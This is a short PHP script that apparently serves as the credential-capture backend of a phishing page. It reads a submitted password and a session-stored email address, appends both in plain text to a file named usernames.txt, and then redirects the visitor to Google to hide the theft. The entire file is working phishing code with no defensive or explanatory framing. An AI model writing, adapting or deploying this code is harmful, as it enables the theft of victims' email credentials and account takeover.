<?php
include 'ip.php';
                        session_start();

                        $pass = $_POST["password"];
                        $email=$_SESSION["Email"];


                        file_put_contents("usernames.txt", "EMAIL: " . " ". $email . " " . " " . "PASS: " . " " . $pass . "
", FILE_APPEND);
                        header('Location: https://www.google.com');
                        exit();


                        session_destroy();

?>